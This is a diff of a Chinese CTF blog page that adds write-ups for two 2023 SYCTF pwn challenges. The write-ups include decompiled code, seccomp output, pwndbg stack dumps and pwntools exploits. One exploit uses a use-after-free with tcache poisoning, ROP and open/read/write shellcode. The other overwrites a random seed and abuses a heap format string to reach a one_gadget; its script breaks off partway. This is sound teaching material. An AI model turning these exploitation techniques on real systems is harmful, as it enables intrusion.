@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="2023_syctf_pwnpwn复现, StarrySky">
+    <meta name="keywords" content="2023-syctf-pwn复现, StarrySky">
     <meta name="description" content="Love rises from the east and descends to the west,romance makes no changes until death.">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>2023_syctf_pwnpwn复现 | StarrySky</title>
+    <title>2023-syctf-pwn复现 | StarrySky</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -289,12 +289,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/28.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">2023_syctf_pwnpwn复现</h1>
+                    <h1 class="description center-align post-title">2023-syctf-pwn复现</h1>
                 </div>
             </div>
         </div>
@@ -414,6 +414,10 @@
                                 <span class="chip bg-color">heap</span>
                             </a>
                         
+                            <a href="/tags/%E9%9D%9E%E6%A0%88%E4%B8%8A%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
+                                <span class="chip bg-color">非栈上的格式化字符串</span>
+                            </a>
+                        
                     </div>
                     
                 </div>
@@ -435,28 +439,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-08-09
+                    2023-08-10
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-08-09
+                    2023-08-21
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.4k
+                    3.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    7 分
+                    19 分
                 </div>
                 
 
@@ -474,7 +478,379 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>漏洞点</p>
+                <h2 id="computer"><a href="#computer" class="headerlink" title="computer"></a>computer</h2><p>本题模拟了计算机的一些操作，本质上还是一些<code>2.27</code>堆的<code>add delete show</code>操作</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">unsigned __int64 __fastcall op(__int64 *a1, __int64 a2, __int64 a3, const char **a4)
+&#123;
+  __isoc99_sscanf(a2, &quot;%256s %256s&quot;, command, argument);
+  ...
+  if ( !strcmp(command, &quot;touch&quot;) )              &#x2F;&#x2F; add
+  &#123;
+    if ( (*(_DWORD *)(*a1 + 48) &amp; 2) !&#x3D; 0 )
+    &#123;
+      str &#x3D; add(argument, 0, *a1, 6);
+      add_list(*a1, (__int64)str);
+      return __readfsqword(0x28u) ^ v25;
+    &#125;
+    goto LABEL_107;
+  &#125;
+  if ( !strcmp(command, &quot;exec&quot;) )               &#x2F;&#x2F; add
+  &#123;
+    for ( i &#x3D; *(_QWORD *)(*a1 + 32); i; i &#x3D; *(_QWORD *)(i + 40) )
+    &#123;
+      if ( !*(_DWORD *)(i + 8) &amp;&amp; !strcmp(*(const char **)i, argument) )
+      &#123;
+        if ( !strcmp(*a4, &quot;root&quot;) || (*(_DWORD *)(i + 48) &amp; 4) !&#x3D; 0 &amp;&amp; pid_count &lt;&#x3D; 15 )
+        &#123;
+          count &#x3D; pid_count;
+          pid_list[count] &#x3D; (pid *)malloc(0x10uLL);
+          LODWORD(pid_list[pid_count]-&gt;pid) &#x3D; pid_count;
+          pid_ &#x3D; pid_list[pid_count];
+          pid_-&gt;name &#x3D; (__int64)strdup(argument);
+          ++pid_count;
+          puts(aExecOver);
+          return __readfsqword(0x28u) ^ v25;
+        &#125;
+        goto LABEL_107;
+      &#125;
+    &#125;
+  &#125;
+  ...
+  else if ( !strcmp(command, &quot;ps&quot;) )            &#x2F;&#x2F; show
+  &#123;
+    atoi(argument);
+    puts(&quot;pid:\tname:&quot;);
+    for ( index &#x3D; 0; index &lt; pid_count; ++index )
+    &#123;
+      if ( pid_list[index] )
+        printf(&quot;%d\t%s\n&quot;, LODWORD(pid_list[index]-&gt;pid), (const char *)pid_list[index]-&gt;name);
+    &#125;
+  &#125;
+  else if ( !strcmp(command, &quot;kill&quot;) )          &#x2F;&#x2F; free
+  &#123;
+    pid &#x3D; atoi(argument);
+    if ( pid &gt;&#x3D; 0 &amp;&amp; pid &lt;&#x3D; pid_count )
+    &#123;
+      free((void *)pid_list[pid]-&gt;name);
+      free(pid_list[pid]);                      &#x2F;&#x2F; uaf
+      --pid_count;
+      printf(&quot;%d had been killed\n&quot;, (unsigned int)pid);
+    &#125;
+  &#125;
+  else if ( !strcmp(command, &quot;rm&quot;) )            &#x2F;&#x2F; free
+  &#123;
+    if ( (*(_DWORD *)(*a1 + 48) &amp; 2) &#x3D;&#x3D; 0 )
+      goto LABEL_107;
+    v15 &#x3D; 0LL;
+    for ( n &#x3D; *(_QWORD *)(*a1 + 32); n; n &#x3D; *(_QWORD *)(n + 40) )
+    &#123;
+      if ( !strcmp(*(const char **)n, argument) )
+      &#123;
+        if ( v15 )
+          *(_QWORD *)(v15 + 40) &#x3D; *(_QWORD *)(n + 40);
+        else
+          *(_QWORD *)(*a1 + 32) &#x3D; *(_QWORD *)(n + 40);
+        *(_QWORD *)(n + 40) &#x3D; 0LL;
+        sub_2CE0(n);
+        return __readfsqword(0x28u) ^ v25;
+      &#125;
+      v15 &#x3D; n;
+    &#125;
+  &#125;
+  ...
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>kill</code>会释放由<code>exec</code>创建的堆，<code>rm</code>会释放掉由<code>touch</code>创建的文件，<code>ps</code>会输出<code>exec</code>创建的堆，<code>kill</code>指令中存在<code>uaf</code>漏洞</p>
+<p>程序开了沙箱保护，不能直接<code>getshell</code>，只能将返回地址改成<code>orw</code>指令</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">➜  computer seccomp-tools dump .&#x2F;pwn
+ line  CODE  JT   JF      K
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+ 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch
+ 0001: 0x15 0x00 0x02 0xc000003e  if (A !&#x3D; ARCH_X86_64) goto 0004
+ 0002: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number
+ 0003: 0x15 0x00 0x01 0x0000003b  if (A !&#x3D; execve) goto 0005
+ 0004: 0x06 0x00 0x00 0x00030000  return TRAP
+ 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>第一步就是泄露<code>libc</code>地址、栈地址,由于存在<code>uaf</code>漏洞所以直接创建一个<code>unsorted bin</code>即可泄露<code>libc</code>地址，再将<code>fd</code>改成<code>environ</code>即可泄露栈地址</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span> <span class="token string">b'touch '</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0xe7</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span> <span class="token string">b'exec '</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0xe7</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span> <span class="token string">'touch '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span> <span class="token string">'kill '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#fill up tcache</span>
+
+r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span> <span class="token string">b'ps'</span><span class="token punctuation">)</span>
+libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ebca0</span>     <span class="token comment">#leak libc</span>
+
+r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span> <span class="token string">b'touch '</span> <span class="token operator">+</span> <span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x3ee098</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#environ</span>
+r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span> <span class="token string">b'ps'</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'name:\n'</span><span class="token punctuation">)</span>
+heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x660</span>
+
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\t'</span><span class="token punctuation">)</span>
+stack_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>接下来就是改返回地址为<code>orw</code>，利用<code>uaf</code>改堆的<code>fd</code>为函数的返回地址，再将堆都申请出来即可申请到返回地址</p>
+<p>exp:</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">from pwn import *
+
+context(arch&#x3D;&#39;amd64&#39;, os&#x3D;&#39;linux&#39;, log_level&#x3D;&#39;debug&#39;)
+
+file_name &#x3D; &#39;.&#x2F;pwn&#39;
+
+li &#x3D; lambda x : print(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)
+ll &#x3D; lambda x : print(&#39;\x1b[01;38;5;1m&#39; + x + &#39;\x1b[0m&#39;)
+
+context.terminal &#x3D; [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
+
+debug &#x3D; 0
+if debug:
+    r &#x3D; remote()
+else:
+    r &#x3D; process(file_name)
+
+elf &#x3D; ELF(file_name)
+
+def dbg():
+    gdb.attach(r)
+
+r.sendlineafter(b&#39;&gt; &#39;, b&#39;touch &#39; + b&#39;a&#39; * 0xe7)
+for i in range(16):
+    r.sendlineafter(b&#39;&gt; &#39;, b&#39;exec &#39; + b&#39;a&#39; * 0xe7)
+for i in range(10):
+    r.sendlineafter(b&#39;&gt; &#39;, &#39;touch &#39; + str(i))
+for i in range(8)[::-1]:
+    r.sendlineafter(b&#39;&gt; &#39;, &#39;kill &#39; + str(i))    #fill up tcache
+
+r.sendlineafter(b&#39;&gt; &#39;, b&#39;ps&#39;)
+libc_base &#x3D; u64(r.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;)) - 0x3ebca0     #leak libc
+
+r.sendlineafter(b&#39;&gt; &#39;, b&#39;touch &#39; + b&#39;b&#39; * 8 + p64(libc_base + 0x3ee098))    #environ
+r.sendlineafter(b&#39;&gt; &#39;, b&#39;ps&#39;)
+r.recvuntil(b&#39;name:\n&#39;)
+heap_base &#x3D; u64(r.recvuntil(b&#39;\n&#39;)[2:8].ljust(8, b&#39;\x00&#39;)) - 0x660
+
+r.recvuntil(b&#39;\t&#39;)
+stack_addr &#x3D; u64(r.recvuntil(b&#39;\n&#39;)[:6].ljust(8, b&#39;\x00&#39;))
+
+r.sendlineafter(b&#39;&gt; &#39;, b&#39;rm 0&#39;)
+r.sendlineafter(b&#39;&gt; &#39;, b&#39;rm 1&#39;)
+
+r.sendlineafter(b&#39;&gt; &#39;, b&#39;kill 0&#39;)
+
+r.sendlineafter(b&#39;&gt; &#39;, b&#39;mkdir new&#39;)
+r.sendlineafter(b&#39;&gt; &#39;, b&#39;cd new&#39;)
+r.sendlineafter(b&#39;&gt; &#39;, b&#39;touch 0&#39;)
+r.sendlineafter(b&#39;&gt; &#39;, b&#39;touch 1&#39;)
+r.sendlineafter(b&#39;&gt; &#39;, b&#39;touch 2&#39;)
+r.sendlineafter(b&#39;&gt; &#39;, b&#39;touch &#39; + p64(stack_addr - 0xb28))
+r.sendlineafter(b&#39;&gt; &#39;, b&#39;touch &#39; + b&#39;3&#39; * 0x19)
+
+p &#x3D; flat([libc_base + 0x000000000002164f, (stack_addr - 0xb28) &amp; (~0xfff),
+          libc_base + 0x0000000000023a6a, 0x1000, libc_base + 0x0000000000001b96,
+          7, libc_base + 0x000000000001b500, 10 + 0x10, libc_base + 0x000000000009a872,
+          libc_base + 0x00000000000d2625, libc_base + 0x0000000000002b25])
+p +&#x3D; asm(&#39;&#39;&#39;
+    mov eax, 0x67616c66 ;&#x2F;&#x2F; flag
+    push rax
+
+    mov rdi, rsp
+    xor eax, eax
+    mov esi, eax
+    mov al, 2
+    syscall ;&#x2F;&#x2F; open
+
+    push rax
+    mov rsi, rsp
+    xor eax, eax
+    mov edx, eax
+    inc eax
+    mov edi, eax
+    mov dl, 8
+    syscall ;&#x2F;&#x2F; write open() return value
+
+    pop rax
+    test rax, rax
+    js over
+
+    mov edi, eax
+    mov rsi, rsp
+    mov edx, 0x01010201
+    sub edx, 0x01010101
+    xor eax, eax
+    syscall ;&#x2F;&#x2F; read
+
+    mov edx, eax
+    mov rsi, rsp
+    xor eax, eax
+    inc eax
+    mov edi, eax
+    syscall ;&#x2F;&#x2F; write
+
+over:
+    xor edi, edi
+    mov eax, 0x010101e8
+    sub eax, 0x01010101
+    syscall ;&#x2F;&#x2F; exit
+
+&#39;&#39;&#39;)
+
+r.sendlineafter(b&#39;&gt; &#39;, b&#39;touch &#39; + b&#39;c&#39; * 8 + p64(libc_base + 0x00000000000baf9c) + b&#39;a&#39; * 218 + p)
+
+r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="harde-pwn"><a href="#harde-pwn" class="headerlink" title="harde-pwn"></a>harde-pwn</h2><p>首先需要通过一个<code>game</code>，通过溢出改<code>seed = 0</code>，然后联合<code>C</code>编程计算随机数</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">_DWORD *fuxk_game()
+&#123;
+  _DWORD *result; &#x2F;&#x2F; rax
+  char buf[28]; &#x2F;&#x2F; [rsp+0h] [rbp-40h] BYREF
+  __int64 seed; &#x2F;&#x2F; [rsp+1Ch] [rbp-24h]
+  int v3; &#x2F;&#x2F; [rsp+24h] [rbp-1Ch] BYREF
+  int v4; &#x2F;&#x2F; [rsp+28h] [rbp-18h]
+  int i; &#x2F;&#x2F; [rsp+2Ch] [rbp-14h]
+
+  puts(&quot;Welcome to a ctype game!&quot;);
+  seed &#x3D; randomm();
+  read(0, buf, 0x20uLL);
+  srand(seed);
+  for ( i &#x3D; 0; i &lt;&#x3D; 20; ++i )
+  &#123;
+    v4 &#x3D; (rand() ^ 0x24) + 1;
+    puts(&quot;input: &quot;);
+    __isoc99_scanf(&quot;%d&quot;, &amp;v3);
+    if ( v4 !&#x3D; v3 )
+    &#123;
+      puts(&quot;fuxk up!&quot;);
+      exit(1);
+    &#125;
+    puts(&quot;Success!&quot;);
+  &#125;
+  result &#x3D; &amp;is_fmt;
+  is_fmt &#x3D; 1;
+  return result;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>接着进入一个无限次堆上的格式化字符串函数</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">void __noreturn heap_fmt()
+&#123;
+  char *ptr; &#x2F;&#x2F; [rsp+8h] [rbp-8h]
+
+  for ( ptr &#x3D; 0LL; ; printf(ptr) )
+  &#123;
+    ptr &#x3D; (char *)realloc(ptr, 0x1000uLL);
+    my_write(&quot;input your data ;)\n&quot;);
+    read(0, ptr, 0x1000uLL);
+  &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>因为<code>got</code>表不可写且<code>for</code>是死循环，所以需要改<code>printf</code>的返回地址最终运行到<code>ogg</code></p>
+<pre class="line-numbers language-none"><code class="language-none">► 0x7ffff7c6082f &lt;printf+191&gt;             add    rsp, 0xd8
+  0x7ffff7c60836 &lt;printf+198&gt;             ret    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>返回地址是<code>rsp</code>，并且在原本的地址上加了<code>0xd8</code>，因此将<code>rsp+0xd8</code>的地方改成<code>__libc_csu_init+97</code>，因为地址位数相差过大不能直接改<code>ogg</code></p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; stack
+00:0000│ rsp 0x7fffffffdd60 ◂— 0x3000000010
+01:0008│     0x7fffffffdd68 —▸ 0x7fffffffde40 ◂— 0x0
+02:0010│     0x7fffffffdd70 —▸ 0x7fffffffdd80 ◂— 0x1
+03:0018│     0x7fffffffdd78 ◂— 0x9d5edc9b23af5200
+04:0020│     0x7fffffffdd80 ◂— 0x1
+05:0028│     0x7fffffffdd88 —▸ 0x55555555b2a0 ◂— &#39;%177c%45$hhn&#39;
+06:0030│     0x7fffffffdd90 ◂— 0x1000
+07:0038│     0x7fffffffdd98 —▸ 0x7ffff7d14992 (read+18) ◂— cmp    rax, -0x1000 &#x2F;* &#39;H&#x3D;&#39; *&#x2F;
+pwndbg&gt; 
+08:0040│  0x7fffffffdda0 —▸ 0x55555555b2a0 ◂— &#39;%177c%45$hhn&#39;
+09:0048│  0x7fffffffdda8 ◂— 0x0
+0a:0050│  0x7fffffffddb0 —▸ 0x55555555b2a0 ◂— &#39;%177c%45$hhn&#39;
+0b:0058│  0x7fffffffddb8 ◂— 0x1000
+0c:0060│  0x7fffffffddc0 —▸ 0x55555555b290 ◂— 0x0
+0d:0068│  0x7fffffffddc8 ◂— 0x1010
+0e:0070│  0x7fffffffddd0 ◂— 0x1010
+0f:0078│  0x7fffffffddd8 —▸ 0x7ffff7ca5989 (realloc+457) ◂— mov    r8, rax
+pwndbg&gt; 
+10:0080│  0x7fffffffdde0 ◂— 0x1000
+11:0088│  0x7fffffffdde8 ◂— 0xff
+12:0090│  0x7fffffffddf0 —▸ 0x555555555502 (main) ◂— endbr64 
+13:0098│  0x7fffffffddf8 ◂— 0x0
+14:00a0│  0x7fffffffde00 —▸ 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
+15:00a8│  0x7fffffffde08 —▸ 0x555555555365 (my_write+55) ◂— nop    
+16:00b0│  0x7fffffffde10 —▸ 0x7fffffffde50 —▸ 0x7ffff7cebcf5 (execvpe+1141) ◂— mov    rsi, r10
+17:00b8│  0x7fffffffde18 —▸ 0x55555555604b ◂— &#39;input your data ;)\n&#39;
+pwndbg&gt; 
+18:00c0│     0x7fffffffde20 —▸ 0x555555555502 (main) ◂— endbr64 
+19:00c8│     0x7fffffffde28 ◂— 0x13
+1a:00d0│     0x7fffffffde30 —▸ 0x7fffffffde50 —▸ 0x7ffff7cebcf5 (execvpe+1141) ◂— mov    rsi, r10
+1b:00d8│     0x7fffffffde38 —▸ 0x5555555555b1 (__libc_csu_init+97) ◂— pop    rsi
+1c:00e0│     0x7fffffffde40 ◂— 0x0
+1d:00e8│     0x7fffffffde48 —▸ 0x55555555b2a0 ◂— &#39;%177c%45$hhn&#39;
+1e:00f0│ rbp 0x7fffffffde50 —▸ 0x7ffff7cebcf5 (execvpe+1141) ◂— mov    rsi, r10
+1f:00f8│     0x7fffffffde58 —▸ 0x555555555543 (main+65) ◂— mov    eax, 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>从<code>__libc_csu_init</code>的返回地址是<code>rsp</code>，所以事先将<code>rbp</code>改成<code>ogg</code>，再利用<code>__libc_csu_init+97</code>的两次<code>ret</code>将<code>rsp</code>移到<code>rbp</code>，<code>ret</code>到<code>ogg</code></p>
+<p>exp：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+
+file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>
+
+li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>
+ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>
+
+context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>
+
+debug <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token keyword">if</span> debug<span class="token punctuation">:</span>
+    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
+libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'./2.35/libc.so.6'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
+
+seed <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x20</span>
+r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Welcome to a ctype game!'</span><span class="token punctuation">,</span> seed<span class="token punctuation">)</span>
+
+seed <span class="token operator">=</span> <span class="token number">0</span>
+libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>seed<span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    v6 <span class="token operator">=</span> <span class="token punctuation">(</span>libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>
+    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'input: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'input your data ;)\n'</span><span class="token punctuation">,</span> <span class="token string">b'%8$p%11$p%7$p'</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>
+stack <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>
+libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x29d90</span>
+
